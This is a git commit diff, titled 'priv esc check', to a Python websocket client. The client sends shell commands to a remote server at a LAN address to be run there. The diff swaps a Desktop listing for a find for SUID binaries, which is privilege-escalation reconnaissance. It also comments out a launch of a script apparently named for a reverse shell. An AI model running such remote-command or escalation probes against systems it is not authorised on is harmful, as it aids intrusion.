e0a787bf88ce96e7917108c95382b6f3e7447013
Samcr00t <roman.mammadov22@gmail.com>
2024-12-08 14:57:09 -0500

    priv esc check

--- test/test_client.py
+++ test/test_client.py
@@ -2,11 +2,11 @@ import asyncio
 import websockets
 import subprocess
 
-subprocess.Popen(["qterminal", "-e", "bash", "-c", "./test_reverse_s.sh"])
+#subprocess.Popen(["qterminal", "-e", "bash", "-c", "./test_reverse_s.sh"])
 async def send_command():
-    uri = "ws://192.168.1.199:8765"  # SERVER_IP yerine sunucunun IP adresini yazın
+    uri = "ws://192.168.1.5:8765"  # SERVER_IP yerine sunucunun IP adresini yazın
     async with websockets.connect(uri) as websocket:
-        command = "ls ~/Desktop"  # Desktop dizinini listeleyen komut
+        command = "find / -type f -perm -04000 -exec basename {} \; 2>/dev/null"  # Desktop dizinini listeleyen komut
         await websocket.send(command)
         print("Komut gönderildi, yanıt bekleniyor...")
         output = await websocket.recv()
